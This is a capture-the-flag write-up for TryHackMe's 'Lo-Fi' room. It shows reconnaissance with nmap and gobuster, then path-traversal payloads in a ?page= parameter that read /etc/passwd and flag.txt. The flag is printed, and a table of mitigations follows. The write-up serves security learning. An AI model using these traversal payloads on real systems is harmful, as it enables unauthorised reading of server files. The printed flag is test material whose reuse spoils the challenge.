# CTF Write-Up: [Lo-Fi](https://tryhackme.com/room/lofi)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flag

<details>
<summary>Flag</summary>

`flag{e4478e0eab69bd642b8238765dcb7d18}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```
nmap <IP_ADDRESS> -vv -oN Nmap/Initial
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 61
```

### Detailed Nmap Scan

```
nmap <IP_ADDRESS> -p 22,80 -A -vv -oN Nmap/Detailed
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 | Not immediately useful |
| 80 | HTTP | Apache httpd 2.2.22 (Ubuntu) | Web app — LFI challenge |

---

## 2. Web Enumeration

### Wappalyzer

| Category | Detail |
|----------|--------|
| Web Server | Apache HTTP Server 2.2.22 |
| Programming Language | PHP |
| Operating System | Ubuntu |
| Video Players | YouTube |

### Directory Brute-Force

```bash
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

> No hidden directories found.

### Identifying the Vulnerability

Navigating to `http://<IP_ADDRESS>/` revealed a Lo-Fi music page. The URL contains a `?page=` parameter used to dynamically load content — a classic indicator of **Local File Inclusion (LFI)**.

```
http://<IP_ADDRESS>/?page=about
```

The PHP backend passes this parameter directly to a file-loading function (e.g. `include()` or `require()`) without sanitisation, allowing path traversal.

---

## 3. Exploitation — LFI via Path Traversal

### Vulnerability

The `?page=` parameter accepts unsanitised user input and passes it directly to a PHP file inclusion function. By using `../` sequences, an attacker can traverse outside the webroot and read arbitrary files from the filesystem.

### Verify LFI — Read `/etc/passwd`

```
http://<IP_ADDRESS>/?page=../../../../etc/passwd
```

**Response (confirms LFI):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
www-data:x:33:33:www-data:/var/www:/bin/sh
```

> Only `root` has `/bin/bash`. No regular user accounts present.

### Read the Flag

The challenge states the flag is in the root of the filesystem:

```
http://<IP_ADDRESS>/?page=../../../../flag.txt
```

**Response:**
```
flag{e4478e0eab69bd642b8238765dcb7d18}
```

> 🚩 `flag{e4478e0eab69bd642b8238765dcb7d18}`

---

## 4. Attack Chain

```
Nmap Scan
    └─► Port 80 — Apache/PHP web app

Web Enumeration
    └─► No hidden directories found via Gobuster
    └─► ?page= parameter identified on main page

LFI Verification
    └─► ../../../../etc/passwd — file read confirmed

Read Flag
    └─► ../../../../flag.txt — flag retrieved
```

---

## 5. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---|---|---|
| 1 | Unsanitised user input passed to PHP `include()` / `require()` | Attacker can read any file the web server user can access | Never pass raw user input to file functions |
| 2 | Path traversal via `../` sequences | Full filesystem traversal from webroot | Use `basename()` or a strict whitelist of allowed page names |
| 3 | Sensitive files readable by `www-data` | `/etc/passwd` and other system files exposed | Apply principle of least privilege; restrict web server file permissions |
| 4 | Flag stored in filesystem root with world-readable permissions | Flag trivially retrieved once LFI confirmed | Not applicable in CTF context — in production, restrict sensitive file permissions |

---

*Lo-Fi — TryHackMe | Rooted ✅*
